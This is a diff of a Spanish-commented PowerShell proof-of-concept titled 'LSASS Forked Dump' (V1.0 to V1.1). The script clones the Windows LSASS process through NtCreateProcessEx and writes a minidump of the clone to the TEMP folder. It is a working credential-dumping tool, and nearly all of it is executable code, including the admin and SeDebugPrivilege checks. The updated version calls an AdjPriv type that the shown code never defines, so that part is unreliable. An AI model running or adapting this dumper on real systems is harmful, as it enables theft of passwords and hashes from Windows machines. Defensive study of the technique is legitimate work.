@@ -1,30 +1,22 @@
-# ================================================
-#     LSASS Forked Dump - PoC V 1.0
+# ========================================================
+#     LSASS Forked Dump - PoC V 1.1 (Robusto)
 #     Autor: Willian Oliveira
-#     Empresa: Escola hack3r 
-#     Traducido por: sezio (sergiovks)
-# ================================================
+#     Traducido y adaptado por: sezio (sergiovks)
+# ========================================================
 
-Write-Host "===============================================" -ForegroundColor Cyan
-Write-Host "         LSASS Forked Dump - PoC - V 1.0       " -ForegroundColor Cyan
+Write-Host "`n===============================================" -ForegroundColor Cyan
+Write-Host "         LSASS Forked Dump - PoC - V 1.1       " -ForegroundColor Cyan
 Write-Host "         Autor: Willian Oliveira               " -ForegroundColor Cyan
-Write-Host "         Empresa: Escola hack3r                " -ForegroundColor Cyan
-Write-Host "         Traducido por: sezio (sergiovks)      " -ForegroundColor Cyan
+Write-Host "         Traducido y adaptado: sezio (sergiovks)      " -ForegroundColor Cyan
 Write-Host "===============================================" -ForegroundColor Cyan
-Write-Host ""
 
-# Definición de la clase con P/Invoke
-Write-Host "[*] Cargando definiciones de API..." -ForegroundColor Yellow
-
+# Cargar definición de API
 Add-Type -TypeDefinition @"
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 public class LSASSForkDump {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-
     [DllImport("ntdll.dll", SetLastError = true)]
     public static extern uint NtCreateProcessEx(
         out IntPtr processHandle,
@@ -48,52 +40,67 @@ public class LSASSForkDump {
         IntPtr UserStreamParam,
         IntPtr CallbackParam
     );
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 }
 "@
 
-Write-Host "[+] API cargada con éxito." -ForegroundColor Green
-Write-Host ""
+Write-Host "[+] API cargada." -ForegroundColor Green
 
-# Abrir el proceso LSASS
-Write-Host "[*] Intentando abrir el proceso LSASS..." -ForegroundColor Yellow
-$lsass = Get-Process lsass
-$PROCESS_QUERY_INFORMATION = 0x0400
-$PROCESS_VM_READ = 0x0010
-$access = $PROCESS_QUERY_INFORMATION -bor $PROCESS_VM_READ
-$lsassHandle = [LSASSForkDump]::OpenProcess($access, $false, $lsass.Id)
-
-if ($lsassHandle -eq [IntPtr]::Zero) {
-    Write-Host "[!] Error al abrir el proceso LSASS!" -ForegroundColor Red
-    return
-} else {
-    Write-Host "[+] Proceso LSASS abierto con éxito." -ForegroundColor Green
+# Verificar si estamos en modo administrador
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')) {
+    Write-Host "[!] Este script debe ejecutarse como Administrador." -ForegroundColor Red
+    exit
 }
 
-Write-Host ""
+# Verificar privilegio SeDebugPrivilege
+$privilegeEnabled = [AdjPriv]::EnablePrivilege("SeDebugPrivilege")
+if (-not $privilegeEnabled) {
+    Write-Host "[!] No se pudo habilitar SeDebugPrivilege." -ForegroundColor Red
+    exit
+}
+Write-Host "[+] SeDebugPrivilege habilitado." -ForegroundColor Green
 
-# Clonar el proceso LSASS
-Write-Host "[*] Intentando clonar el proceso LSASS..." -ForegroundColor Yellow
-[IntPtr]$forkedHandle = [IntPtr]::Zero
-$ntstatus = [LSASSForkDump]::NtCreateProcessEx([ref]$forkedHandle, 0x001F0FFF, [IntPtr]::Zero, $lsassHandle, $true, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, $false)
-
-if ($forkedHandle -eq [IntPtr]::Zero) {
-    Write-Host "[!] Error al clonar el proceso LSASS!" -ForegroundColor Red
-    return
-} else {
-    Write-Host "[+] Proceso LSASS clonado con éxito." -ForegroundColor Green
+# Obtener PID de lsass
+try {
+    $lsass = Get-Process -Name lsass -ErrorAction Stop
+    Write-Host "[+] LSASS PID: $($lsass.Id)" -ForegroundColor Green
+} catch {
+    Write-Host "[!] No se pudo obtener el proceso LSASS." -ForegroundColor Red
+    exit
 }
 
-Write-Host ""
+# Intentar abrir LSASS solo para clonarlo
+$PROCESS_CREATE_PROCESS = 0x0080
+$handle = [LSASSForkDump]::OpenProcess($PROCESS_CREATE_PROCESS, $false, $lsass.Id)
 
-# Crear el volcado del clon
-Write-Host "[*] Creando el volcado del proceso clonado..." -ForegroundColor Yellow
+if ($handle -eq [IntPtr]::Zero) {
+    Write-Host "[!] Falló al abrir LSASS para clonarlo. ¿Está Credential Guard activo?" -ForegroundColor Red
+    exit
+} else {
+    Write-Host "[+] Handle a LSASS obtenido para clonación." -ForegroundColor Green
+}
+
+# Clonar proceso
+[IntPtr]$cloneHandle = [IntPtr]::Zero
+$ntstatus = [LSASSForkDump]::NtCreateProcessEx([ref]$cloneHandle, 0x1FFFFF, [IntPtr]::Zero, $handle, $true, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, $false)
+
+if ($cloneHandle -eq [IntPtr]::Zero -or $ntstatus -ne 0) {
+    Write-Host "[!] Error al clonar LSASS. NtStatus: 0x$("{0:X}" -f $ntstatus)" -ForegroundColor Red
+    exit
+} else {
+    Write-Host "[+] LSASS clonado exitosamente." -ForegroundColor Green
+}
+
+# Crear volcado del proceso clonado
 $dumpPath = "$env:TEMP\forked_lsass.dmp"
 $fs = New-Object IO.FileStream($dumpPath, [IO.FileMode]::Create, [IO.FileAccess]::Write)
-$success = [LSASSForkDump]::MiniDumpWriteDump($forkedHandle, 0, $fs.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
+$success = [LSASSForkDump]::MiniDumpWriteDump($cloneHandle, 0, $fs.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
 $fs.Close()
 
 if ($success) {
     Write-Host "[+] Volcado creado con éxito en: $dumpPath" -ForegroundColor Green
 } else {
-    Write-Host "[!] Error al crear el volcado!" -ForegroundColor Red
+    Write-Host "[!] Fallo al crear el volcado del proceso clonado." -ForegroundColor Red
 }
